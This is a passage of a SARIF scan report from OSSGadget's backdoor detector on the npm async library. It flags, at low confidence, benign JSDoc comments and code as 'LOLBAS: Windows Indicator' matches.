{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.0.0+4a24249b20"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5730,
                  "startColumn": 12,
                  "endLine": 5730,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Array} tasks - An array of [async functions]{@link AsyncFunction}\n * to run.\n * Each function should complete with any number of `result` values.\n",
                    "rendered": {
                      "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Array} tasks - An array of [async functions]{@link AsyncFunction}\n * to run.\n * Each function should complete with any number of `result` values.\n",
                      "markdown": "` * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Array} tasks - An array of [async functions]{@link AsyncFunction}\n * to run.\n * Each function should complete with any number of `result` values.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5688,
                  "startColumn": 12,
                  "endLine": 5688,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.whilst]{@link module:ControlFlow.whilst}\n * @category Control Flow\n * @param {AsyncFunction} test - asynchronous truth test to perform before each\n * execution of `iteratee`. Invoked with (callback).\n * @param {AsyncFunction} iteratee - An async function which is called each time\n",
                    "rendered": {
                      "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.whilst]{@link module:ControlFlow.whilst}\n * @category Control Flow\n * @param {AsyncFunction} test - asynchronous truth test to perform before each\n * execution of `iteratee`. Invoked with (callback).\n * @param {AsyncFunction} iteratee - An async function which is called each time\n",
                      "markdown": "` * @memberOf module:ControlFlow\n * @method\n * @see [async.whilst]{@link module:ControlFlow.whilst}\n * @category Control Flow\n * @param {AsyncFunction} test - asynchronous truth test to perform before each\n * execution of `iteratee`. Invoked with (callback).\n * @param {AsyncFunction} iteratee - An async function which is called each time\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5626,
                  "startColumn": 12,
                  "endLine": 5626,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {AsyncFunction} test - asynchronous truth test to perform before each\n * execution of `iteratee`. Invoked with (callback).\n * @param {AsyncFunction} iteratee - An async function which is called each time\n",
                    "rendered": {
                      "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {AsyncFunction} test - asynchronous truth test to perform before each\n * execution of `iteratee`. Invoked with (callback).\n * @param {AsyncFunction} iteratee - An async function which is called each time\n",
                      "markdown": "` * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {AsyncFunction} test - asynchronous truth test to perform before each\n * execution of `iteratee`. Invoked with (callback).\n * @param {AsyncFunction} iteratee - An async function which is called each time\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5558,
                  "startColumn": 41,
                  "endLine": 5558,
                  "endColumn": 45,
                  "snippet": {
                    "text": " * value.\n * @param {Function} [callback] - An optional callback which is called when one\n * of the tasks has succeeded, or all have failed. It receives the `err` and\n * `result` arguments of the last attempt at completing the `task`. Invoked with\n * (err, results).\n * @returns {Promise} a promise, if no callback is passed\n * @example\n",
                    "rendered": {
                      "text": " * value.\n * @param {Function} [callback] - An optional callback which is called when one\n * of the tasks has succeeded, or all have failed. It receives the `err` and\n * `result` arguments of the last attempt at completing the `task`. Invoked with\n * (err, results).\n * @returns {Promise} a promise, if no callback is passed\n * @example\n",
                      "markdown": "` * value.\n * @param {Function} [callback] - An optional callback which is called when one\n * of the tasks has succeeded, or all have failed. It receives the `err` and\n * `result` arguments of the last attempt at completing the `task`. Invoked with\n * (err, results).\n * @returns {Promise} a promise, if no callback is passed\n * @example\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5551,
                  "startColumn": 12,
                  "endLine": 5551,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Array|Iterable|AsyncIterable|Object} tasks - A collection containing functions to\n * run, each function is passed a `callback(err, result)` it must call on\n * completion with an error `err` (which can be `null`) and an optional `result`\n",
                    "rendered": {
                      "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Array|Iterable|AsyncIterable|Object} tasks - A collection containing functions to\n * run, each function is passed a `callback(err, result)` it must call on\n * completion with an error `err` (which can be `null`) and an optional `result`\n",
                      "markdown": "` * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Array|Iterable|AsyncIterable|Object} tasks - A collection containing functions to\n * run, each function is passed a `callback(err, result)` it must call on\n * completion with an error `err` (which can be `null`) and an optional `result`\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5380,
                  "startColumn": 12,
                  "endLine": 5380,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.times]{@link module:ControlFlow.times}\n * @category Control Flow\n * @param {number} n - The number of times to run the function.\n * @param {AsyncFunction} iteratee - The async function to call `n` times.\n * Invoked with the iteration index and a callback: (n, next).\n",
                    "rendered": {
                      "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.times]{@link module:ControlFlow.times}\n * @category Control Flow\n * @param {number} n - The number of times to run the function.\n * @param {AsyncFunction} iteratee - The async function to call `n` times.\n * Invoked with the iteration index and a callback: (n, next).\n",
                      "markdown": "` * @memberOf module:ControlFlow\n * @method\n * @see [async.times]{@link module:ControlFlow.times}\n * @category Control Flow\n * @param {number} n - The number of times to run the function.\n * @param {AsyncFunction} iteratee - The async function to call `n` times.\n * Invoked with the iteration index and a callback: (n, next).\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5373,
                  "startColumn": 93,
                  "endLine": 5373,
                  "endColumn": 97,
                  "snippet": {
                    "text": "}\n\n/**\n * The same as [times]{@link module:ControlFlow.times} but runs only a single async operation at a time.\n *\n * @name timesSeries\n * @static\n",
                    "rendered": {
                      "text": "}\n\n/**\n * The same as [times]{@link module:ControlFlow.times} but runs only a single async operation at a time.\n *\n * @name timesSeries\n * @static\n",
                      "markdown": "`}\n\n/**\n * The same as [times]{@link module:ControlFlow.times} but runs only a single async operation at a time.\n *\n * @name timesSeries\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5344,
                  "startColumn": 12,
                  "endLine": 5344,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.map]{@link module:Collections.map}\n * @category Control Flow\n * @param {number} n - The number of times to run the function.\n * @param {AsyncFunction} iteratee - The async function to call `n` times.\n * Invoked with the iteration index and a callback: (n, next).\n",
                    "rendered": {
                      "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.map]{@link module:Collections.map}\n * @category Control Flow\n * @param {number} n - The number of times to run the function.\n * @param {AsyncFunction} iteratee - The async function to call `n` times.\n * Invoked with the iteration index and a callback: (n, next).\n",
                      "markdown": "` * @memberOf module:ControlFlow\n * @method\n * @see [async.map]{@link module:Collections.map}\n * @category Control Flow\n * @param {number} n - The number of times to run the function.\n * @param {AsyncFunction} iteratee - The async function to call `n` times.\n * Invoked with the iteration index and a callback: (n, next).\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5324,
                  "startColumn": 65,
                  "endLine": 5324,
                  "endColumn": 69,
                  "snippet": {
                    "text": " * @see [async.times]{@link module:ControlFlow.times}\n * @category Control Flow\n * @param {number} count - The number of times to run the function.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - The async function to call `n` times.\n * Invoked with the iteration index and a callback: (n, next).\n * @param {Function} callback - see [async.map]{@link module:Collections.map}.\n",
                    "rendered": {
                      "text": " * @see [async.times]{@link module:ControlFlow.times}\n * @category Control Flow\n * @param {number} count - The number of times to run the function.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - The async function to call `n` times.\n * Invoked with the iteration index and a callback: (n, next).\n * @param {Function} callback - see [async.map]{@link module:Collections.map}.\n",
                      "markdown": "` * @see [async.times]{@link module:ControlFlow.times}\n * @category Control Flow\n * @param {number} count - The number of times to run the function.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - The async function to call `n` times.\n * Invoked with the iteration index and a callback: (n, next).\n * @param {Function} callback - see [async.map]{@link module:Collections.map}.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5322,
                  "startColumn": 12,
                  "endLine": 5322,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.times]{@link module:ControlFlow.times}\n * @category Control Flow\n * @param {number} count - The number of times to run the function.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - The async function to call `n` times.\n",
                    "rendered": {
                      "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.times]{@link module:ControlFlow.times}\n * @category Control Flow\n * @param {number} count - The number of times to run the function.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - The async function to call `n` times.\n",
                      "markdown": "` * @memberOf module:ControlFlow\n * @method\n * @see [async.times]{@link module:ControlFlow.times}\n * @category Control Flow\n * @param {number} count - The number of times to run the function.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - The async function to call `n` times.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5314,
                  "startColumn": 101,
                  "endLine": 5314,
                  "endColumn": 105,
                  "snippet": {
                    "text": "}\n\n/**\n * The same as [times]{@link module:ControlFlow.times} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name timesLimit\n",
                    "rendered": {
                      "text": "}\n\n/**\n * The same as [times]{@link module:ControlFlow.times} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name timesLimit\n",
                      "markdown": "`}\n\n/**\n * The same as [times]{@link module:ControlFlow.times} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name timesLimit\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5248,
                  "startColumn": 9,
                  "endLine": 5248,
                  "endColumn": 18,
                  "snippet": {
                    "text": " * @param {*} [info] - Any variable you want attached (`string`, `object`, etc)\n * to timeout Error for more information..\n * @returns {AsyncFunction} Returns a wrapped function that can be used with any\n * of the control flow functions.\n * Invoke this function with the same parameters as you would `asyncFunc`.\n * @example\n *\n",
                    "rendered": {
                      "text": " * @param {*} [info] - Any variable you want attached (`string`, `object`, etc)\n * to timeout Error for more information..\n * @returns {AsyncFunction} Returns a wrapped function that can be used with any\n * of the control flow functions.\n * Invoke this function with the same parameters as you would `asyncFunc`.\n * @example\n *\n",
                      "markdown": "` * @param {*} [info] - Any variable you want attached (`string`, `object`, etc)\n * to timeout Error for more information..\n * @returns {AsyncFunction} Returns a wrapped function that can be used with any\n * of the control flow functions.\n * Invoke this function with the same parameters as you would `asyncFunc`.\n * @example\n *\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5039,
                  "startColumn": 93,
                  "endLine": 5039,
                  "endColumn": 97,
                  "snippet": {
                    "text": "var someLimit$1 = awaitify(someLimit, 4);\n\n/**\n * The same as [`some`]{@link module:Collections.some} but runs only a single async operation at a time.\n *\n * @name someSeries\n * @static\n",
                    "rendered": {
                      "text": "var someLimit$1 = awaitify(someLimit, 4);\n\n/**\n * The same as [`some`]{@link module:Collections.some} but runs only a single async operation at a time.\n *\n * @name someSeries\n * @static\n",
                      "markdown": "`var someLimit$1 = awaitify(someLimit, 4);\n\n/**\n * The same as [`some`]{@link module:Collections.some} but runs only a single async operation at a time.\n *\n * @name someSeries\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5022,
                  "startColumn": 65,
                  "endLine": 5022,
                  "endColumn": 69,
                  "snippet": {
                    "text": " * @alias anyLimit\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - An async truth test to apply to each item\n * in the collections in parallel.\n * The iteratee should complete with a boolean `result` value.\n",
                    "rendered": {
                      "text": " * @alias anyLimit\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - An async truth test to apply to each item\n * in the collections in parallel.\n * The iteratee should complete with a boolean `result` value.\n",
                      "markdown": "` * @alias anyLimit\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - An async truth test to apply to each item\n * in the collections in parallel.\n * The iteratee should complete with a boolean `result` value.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 5012,
                  "startColumn": 101,
                  "endLine": 5012,
                  "endColumn": 105,
                  "snippet": {
                    "text": "var some$1 = awaitify(some, 3);\n\n/**\n * The same as [`some`]{@link module:Collections.some} but runs a maximum of `limit` async operations at a time.\n *\n * @name someLimit\n * @static\n",
                    "rendered": {
                      "text": "var some$1 = awaitify(some, 3);\n\n/**\n * The same as [`some`]{@link module:Collections.some} but runs a maximum of `limit` async operations at a time.\n *\n * @name someLimit\n * @static\n",
                      "markdown": "`var some$1 = awaitify(some, 3);\n\n/**\n * The same as [`some`]{@link module:Collections.some} but runs a maximum of `limit` async operations at a time.\n *\n * @name someLimit\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 4910,
                  "startColumn": 20,
                  "endLine": 4910,
                  "endColumn": 24,
                  "snippet": {
                    "text": "}\n\n/**\n * Returns `true` if at least one element in the `coll` satisfies an async test.\n * If any iteratee call returns `true`, the main `callback` is immediately\n * called.\n *\n",
                    "rendered": {
                      "text": "}\n\n/**\n * Returns `true` if at least one element in the `coll` satisfies an async test.\n * If any iteratee call returns `true`, the main `callback` is immediately\n * called.\n *\n",
                      "markdown": "`}\n\n/**\n * Returns `true` if at least one element in the `coll` satisfies an async test.\n * If any iteratee call returns `true`, the main `callback` is immediately\n * called.\n *\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 4765,
                  "startColumn": 12,
                  "endLine": 4765,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Array|Iterable|AsyncIterable|Object} tasks - A collection containing\n * [async functions]{@link AsyncFunction} to run in series.\n * Each function can complete with any number of optional `result` values.\n",
                    "rendered": {
                      "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Array|Iterable|AsyncIterable|Object} tasks - A collection containing\n * [async functions]{@link AsyncFunction} to run in series.\n * Each function can complete with any number of optional `result` values.\n",
                      "markdown": "` * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Array|Iterable|AsyncIterable|Object} tasks - A collection containing\n * [async functions]{@link AsyncFunction} to run in series.\n * Each function can complete with any number of optional `result` values.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 4695,
                  "startColumn": 12,
                  "endLine": 4695,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.retry]{@link module:ControlFlow.retry}\n * @category Control Flow\n * @param {Object|number} [opts = {times: 5, interval: 0}| 5] - optional\n * options, exactly the same as from `retry`, except for a `opts.arity` that\n * is the arity of the `task` function, defaulting to `task.length`\n",
                    "rendered": {
                      "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.retry]{@link module:ControlFlow.retry}\n * @category Control Flow\n * @param {Object|number} [opts = {times: 5, interval: 0}| 5] - optional\n * options, exactly the same as from `retry`, except for a `opts.arity` that\n * is the arity of the `task` function, defaulting to `task.length`\n",
                      "markdown": "` * @memberOf module:ControlFlow\n * @method\n * @see [async.retry]{@link module:ControlFlow.retry}\n * @category Control Flow\n * @param {Object|number} [opts = {times: 5, interval: 0}| 5] - optional\n * options, exactly the same as from `retry`, except for a `opts.arity` that\n * is the arity of the `task` function, defaulting to `task.length`\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 4619,
                  "startColumn": 5,
                  "endLine": 4619,
                  "endColumn": 14,
                  "snippet": {
                    "text": " * });\n *\n * // to retry individual methods that are not as reliable within other\n * // control flow functions, use the `retryable` wrapper:\n * async.auto({\n *     users: api.getUsers.bind(api),\n *     payments: async.retryable(3, api.getPayments.bind(api))\n",
                    "rendered": {
                      "text": " * });\n *\n * // to retry individual methods that are not as reliable within other\n * // control flow functions, use the `retryable` wrapper:\n * async.auto({\n *     users: api.getUsers.bind(api),\n *     payments: async.retryable(3, api.getPayments.bind(api))\n",
                      "markdown": "` * });\n *\n * // to retry individual methods that are not as reliable within other\n * // control flow functions, use the `retryable` wrapper:\n * async.auto({\n *     users: api.getUsers.bind(api),\n *     payments: async.retryable(3, api.getPayments.bind(api))\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 4609,
                  "startColumn": 33,
                  "endLine": 4609,
                  "endColumn": 42,
                  "snippet": {
                    "text": " * });\n *\n * // try calling apiMethod only when error condition satisfies, all other\n * // errors will abort the retry control flow and return to final callback\n * async.retry({\n *   errorFilter: function(err) {\n *     return err.message === 'Temporary error'; // only retry on a specific error\n",
                    "rendered": {
                      "text": " * });\n *\n * // try calling apiMethod only when error condition satisfies, all other\n * // errors will abort the retry control flow and return to final callback\n * async.retry({\n *   errorFilter: function(err) {\n *     return err.message === 'Temporary error'; // only retry on a specific error\n",
                      "markdown": "` * });\n *\n * // try calling apiMethod only when error condition satisfies, all other\n * // errors will abort the retry control flow and return to final callback\n * async.retry({\n *   errorFilter: function(err) {\n *     return err.message === 'Temporary error'; // only retry on a specific error\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 4579,
                  "startColumn": 55,
                  "endLine": 4579,
                  "endColumn": 64,
                  "snippet": {
                    "text": " *\n * @example\n *\n * // The `retry` function can be used as a stand-alone control flow by passing\n * // a callback, as shown below:\n *\n * // try calling apiMethod 3 times\n",
                    "rendered": {
                      "text": " *\n * @example\n *\n * // The `retry` function can be used as a stand-alone control flow by passing\n * // a callback, as shown below:\n *\n * // try calling apiMethod 3 times\n",
                      "markdown": "` *\n * @example\n *\n * // The `retry` function can be used as a stand-alone control flow by passing\n * // a callback, as shown below:\n *\n * // try calling apiMethod 3 times\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
